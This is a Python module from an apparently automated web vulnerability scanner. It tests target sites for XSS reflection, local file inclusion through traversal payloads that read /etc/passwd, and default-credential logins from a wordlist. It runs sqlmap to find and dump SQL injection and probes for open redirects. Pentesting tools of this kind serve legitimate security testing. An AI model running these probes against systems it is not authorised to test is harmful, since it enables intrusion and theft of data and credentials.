import requests
from src import toolbox
from src.webutils import get_headers, get_page_source
from urllib.parse import quote_plus
import subprocess
from urllib.parse import urlparse
import re
from alive_progress import alive_bar

import time

def search_reflection(page:str,payload):
        """
        search for payload inside response page
        """
        line = ""
        cnt = 0
        for c in page:
            cnt += 1
            if c == "\n":
                if line.find(payload) != -1:
                    return True
                line = ""
            else:
                line += c
        return False

def test_reflection(url:str,param:str,method:str,type:str)->str:
    """
    test reflection with a parameter for XSS attack
    """

    payloads = [
        "lincox><",
        "lincox\"=",
        f"</{type}><img src=\"lincox\">"
    ]

    found = 0
    best_payload = ""

    for payload in payloads:
        if method == "GET":
            r = requests.get(f"{url}/?{param}={quote_plus(payload)}",headers=get_headers())
        elif method == "POST":
            r = requests.post(f"{url}",data={param:payload},headers=get_headers())

        if search_reflection(r.text,payload):
            found += 1
            best_payload = payload

    if found == 0:
        return None
    else:
        return best_payload

def test_dom_reflection(url:str,param:str,type:str)->str:
    """
    test reflection with a parameter for DOM based XSS attack
    """ 
    
    payloads = [
        "lincox><",
        "lincox\"=",
        f"</{type}><img src=\"lincox\">"
    ]

    found = 0
    best_payload = ""

    for payload in payloads:
        page = get_page_source(f"{url}/?{param}={payload}")
        if search_reflection(page,payload):
            found += 1
            best_payload = payload

    if found == 0:
        return None
    else:
        return best_payload

def search_lfi_marker(html:str,os_type:str)->bool:
    """
    search for LFI markers in a web page
    depending on the OS
    os_type : linux or windows
    """

    if os_type == "linux":
        line = ""
        for c in html:
            if c == '\n':
                if line.find('0:0:root') != -1: # first line of /etc/passwd in linux system
                    return True
                line = ""
            else:
                line += c
    
    # TODO : windows marker
    
    return False
    
def test_lfi_linux(url:str,params:list,method:str)->str:
    """
    test for LFI in parameters with linux payload
    """

    if method.lower() == "get":

        # simple test
        parameters = "?"
        payload = '/etc/passwd'
        for param in params:
            parameters += f"&{param}={quote_plus(payload)}"
        r = requests.get(url+parameters,headers=get_headers())
        result = search_lfi_marker(r.text,"linux")
        if result:
            return parameters

        # simple directory traversal
        for i in range(1,11):
            parameters = "?"
            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
            for param in params:
                parameters += f"&{param}={quote_plus(payload)}"
            r = requests.get(url+parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

        # simple filter evasion
        for i in range(1,11):
            parameters = "?"
            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
            for param in params:
                parameters += f"&{param}={quote_plus(payload)}"
            r = requests.get(url+parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

    if method.lower() == "post":
        # simple test
        payload = '/etc/passwd'
        parameters = {}
        for param in params:
            parameters[param] = payload
        r = requests.post(url,data=parameters,headers=get_headers())
        result = search_lfi_marker(r.text,"linux")
        if result:
            return parameters

        # simple directory traversal
        for i in range(1,11):
            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
            parameters = {}
            for param in params:
                parameters[param] = payload
            r = requests.post(url,data=parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

        # simple filter evasion
        for i in range(1,11):
            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
            parameters = {}
            for param in params:
                parameters[param] = payload
            r = requests.post(url,data=parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

    return None

def test_sqli(command:list,url:str,params:list,method:str)->list:
    """
    use SQL map to search for SQL injection
    no risk/level tuning for now
    """

    
    parameters = ""
    
    for param in params:
        parameters += f"&{param}=lincox@gmail.com"
    
    if method.lower() == "get":
        command += [
            '-u', url+'?'+parameters,
            '--batch',
            '--output-dir','sqlmap_output',
            '--dump-format=csv',
            '--ignore-code','404'
        ]

    if method.lower() == "post":
        command += [
            '-u', url,
            '--data',parameters,
            '--batch',
            '--output-dir','sqlmap_output',
            '--dump-format=csv',
            '--ignore-code','404'
        ]
    
    process = subprocess.run(command, capture_output=True, text=True, check=False)

    output = process.stdout
    # if process.returncode != 0 :
    #     toolbox.warn(f"sqlmap returned a non zero error code {process.returncode}")
    #     toolbox.warn(f"sqlmap stderr: {process.stderr}")
    #     print(output)

    # print(output)

    found_parameters = re.finditer(r"---\n(Parameter:.*)---", output,re.MULTILINE|re.DOTALL|re.IGNORECASE)
    results = []

    for parameter in found_parameters:

        pattern = r"""
        \s*Type:\s*(?P<type>.*)\n
        \s*Title:\s*(?P<title>.*)\n
        \s*Payload:\s*(?P<payload>.*)\n
        """

        matches = re.finditer(pattern, parameter.group(), re.VERBOSE)
        parameter = re.findall(r"Parameter: (.+)", parameter.group())[0]

        for match in matches:
            toolbox.debug(f"Found injection {match.group('type')} / {match.group('title')} on {parameter} at {url}")
            results.append((url,method,parameter,match.group("type"),match.group("title"),match.group("payload").strip()))
    
    return results if len(results) > 0 else None

def test_open_redirect(url:str,parameter:str)->str:
    """
    test for open redirect in GET parameter on given url
    """

    timeout = 5

    test_url = url + '?' + parameter + f"=//google.com/{url}"
    # toolbox.debug(f"Testing URL: {test_url}")
    response = requests.get(test_url, allow_redirects=False, timeout=timeout)

    if 300 <= response.status_code < 400:
        redirect_location = response.headers.get("Location")
        if redirect_location:
            toolbox.debug(f"Redirect found: {response.status_code} to {redirect_location}")
            if is_external_redirect(url, redirect_location):
                    toolbox.debug(f"Open Redirect Found: {test_url} redirects to external url {redirect_location}")
                    return "external"
            else:
                toolbox.debug(f"Internal Redirect: {test_url} redirects to {redirect_location}")
                return "internal"
    elif response.status_code != 200:
        toolbox.debug(f"Unexpected status code: {response.status_code}")

    return False

def is_external_redirect(original_url:str, redirect_url:str)->bool:
    """
    Check if a redirect is external (to a different domain)
    """
    original_domain = urlparse(original_url).netloc
    redirect_domain = urlparse(redirect_url).netloc

    if not redirect_domain:
        return False

    return original_domain != redirect_domain

def test_default_credentials(form:dict)->dict:
    """
    test for most used credentials:
    """

    counter = 0
    is_first = True
    default_size = 0

    credentials_list = []
    valid = []

    # wordlist format : Vendor,Username,Password,Comments
    with open("data/default-passwords.csv") as wordlist:
        for line in wordlist:
            line = line.replace('\n','').split(',')
            username, password = line[1],line[2]
            if (username,password) not in credentials_list:
                credentials_list.append((username,password))

    credentials_list = list(set(credentials_list))

    with alive_bar(len(credentials_list), title=toolbox.get_header("ATTACK")+f"Trying default credentials on {form['url']}", bar=None, enrich_print=False) as bar:
        for username,password in credentials_list:
            if form['method'].lower() == 'get':
                parameters = "?"
                for param in form['parameters']:
                
                    if param['name'].find('user') != -1 or param['name'].find('email') != -1:
                        parameters += f"&{param['name']}={quote_plus(username)}"
                    elif param['name'].find('password') != -1 or param['name'].find('passwd') != -1:
                        parameters += f"&{param['name']}={quote_plus(password)}"
                    else:
                        if param['value'] == '' or param['value'] == None:
                            parameters += f"&{param['name']}=lincox"
                        else:
                            parameters += f"&{param['name']}={param['value']}"

                if is_first:
                    is_first = False
                    def_parameters = "?"
                    for param in form['parameters']:
                        if param['value'] == '' or param['value'] == None:
                            def_parameters += f"&{param['name']}=lincox@gmail.com"
                        else:
                            def_parameters += f"&{param['name']}={param['value']}"
                    r = requests.get(form['url']+def_parameters,headers=get_headers())
                    default_size = len(r.text.split(' '))
                
                r = requests.get(form['url']+parameters,headers=get_headers())
                if len(r.text.split(' ')) != default_size:
                    valid.append((username,password))

            if form['method'].lower() == 'post':
                parameters = {}
                for param in form['parameters']:
                
                    if param['name'].find('user') != -1 or param['name'].find('email') != -1:
                        parameters[param['name']] = username
                    elif param['name'].find('password') != -1 or param['name'].find('passwd') != -1:
                        parameters[param['name']] = password
                    else:
                        if param['value'] == '' or param['value'] == None:
                            parameters[param['name']] = "lincox"
                        else:
                            parameters[param['name']] = param['value']
                    
                if is_first:
                    is_first = False
                    def_parameters = {}
                    for param in form['parameters']:
                        if param['value'] == '' or param['value'] == None:
                            def_parameters[param['name']] = "lincox@gmail.com"
                        else:
                            def_parameters[param['name']] = param['value']
                    r = requests.post(form['url'],data=def_parameters,headers=get_headers())
                    default_size = len(r.text.split(' '))

                r = requests.post(form['url'],data=parameters,headers=get_headers())
                if username == "admin" and password == "root":
                    print(len(r.text.split(' ')),default_size)
                    print(r.text)
                if len(r.text.split(' ')) != default_size:
                    valid.append((username,password))

            bar()
    
    if len(valid) > 0:
        return valid
    else:
        return None

def bruteforce_form(form:dict)->dict:
    """
    bruteforce form with wordlists of passwords and users
    """

    pass